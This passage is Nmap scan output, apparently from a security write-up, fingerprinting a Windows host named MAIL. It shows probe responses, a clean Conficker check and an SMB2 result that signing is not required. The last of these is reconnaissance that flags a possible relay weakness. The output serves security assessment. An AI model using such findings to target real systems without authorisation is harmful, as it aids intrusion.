WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=N)

Uptime guess: 0.011 days (since Mon Aug 18 11:01:12 2025)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 47593/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 60626/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 54694/udp): CLEAN (Failed to receive data)
|   Check 4 (port 17118/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-08-18T15:16:50
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```